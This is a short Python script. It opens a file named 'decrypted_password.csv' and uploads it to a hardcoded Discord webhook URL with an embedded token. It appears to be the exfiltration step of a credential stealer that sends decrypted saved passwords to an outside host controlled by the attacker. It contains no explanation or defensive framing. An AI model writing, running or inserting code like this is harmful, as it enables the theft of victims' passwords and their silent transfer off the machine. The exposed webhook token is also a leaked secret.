from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1370169947359154301/iVEP_rnJDMJqWMv5vfSQUfz5rAgN5mvLQLYM7Fu31WZ1qRcjiPMAtIAmWCTpSZNQcTb9")

with open("decrypted_password.csv", "rb") as f:
    webhook.add_file(file=f.read(), filename="decrypted_password.csv")

response = webhook.execute()
